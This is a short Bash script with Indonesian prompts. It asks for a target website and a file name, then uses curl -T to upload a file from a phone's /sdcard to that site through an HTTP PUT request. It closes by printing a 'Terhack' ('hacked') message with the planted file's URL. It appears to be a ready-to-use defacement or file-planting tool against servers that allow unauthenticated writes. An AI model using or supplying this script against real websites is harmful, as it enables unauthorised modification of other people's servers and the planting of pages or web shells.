read -p " Masukan Web Target => " target;
read -p " Masukan Nama Script => " sc;

curl -T /sdcard/$sc $target

echo "[!] Terhack =>" $target/$sc | lolcat